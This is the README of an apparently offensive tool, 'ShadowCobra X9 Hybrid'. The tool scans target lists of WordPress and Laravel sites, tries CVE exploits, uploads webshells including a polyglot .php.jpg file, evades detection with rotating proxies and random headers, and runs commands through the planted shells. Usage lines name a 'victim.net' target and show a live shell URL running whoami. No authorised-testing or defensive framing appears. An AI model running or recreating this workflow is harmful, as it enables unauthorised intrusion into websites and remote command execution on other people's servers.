ShadowCobra X9 Hybrid

Advanced Vulnerability Scanner + Live Shell Hunter
Hybrid Edition by ShadowHax (2025)


---

🚀 Features

CVE fingerprinting & exploit attempts (WordPress, Laravel, plugins, themes)

Auto file upload testing (.php, .php.jpg, .phtml, .phar)

Proxy rotation & random headers for stealth

Multi-threaded scanning (fast AF)

Live shell verification (whoami check)

Real-time Tkinter dashboard for shell monitoring



---

📦 Requirements

pip install requests colorama termcolor tqdm

> Optional: socks5 proxies supported




---

📂 Project Structure

ShadowCobra-X9-Hybrid/
│── ShadowCobraX9.py       # Main scanner
│── targets.txt            # Target list
│── proxy.txt              # Proxy list (optional)
│── shadow.php             # Webshell payload
│── shell.php.jpg          # Polyglot stealth shell
│── live_shells.txt        # Verified shells (auto-generated)
│── debug_shell_hits.txt   # Debug hits (auto-generated)


---

🔧 Usage

1. Prepare Targets

Add your targets (domains or IPs) in targets.txt:

example.com
testsite.org
victim.net

2. Run Scanner

Basic scan:

python ShadowCobraX9.py

Silent mode (only shows live shells):

python ShadowCobraX9.py --silent

Force HTTPS:

python ShadowCobraX9.py --https

Custom command to execute via shell:

python ShadowCobraX9.py --cmd "id"


---

📊 Output

Console: Shows [SAFE], [VULNERABLE], and [!!!] LIVE SHELL in color

File: live_shells.txt contains verified shell URLs

Dashboard: GUI panel listing all verified www-data shells in real time



---

⚡ Example Run

python ShadowCobraX9.py --silent --cmd "whoami"

Output:

[VULNERABLE] http://victim.net → CVE-2025-26892 (WordPress Celestial Aura v2.2)
[!!!] LIVE SHELL (Verified www-data): http://victim.net/uploads/shadow.php?cmd=whoami

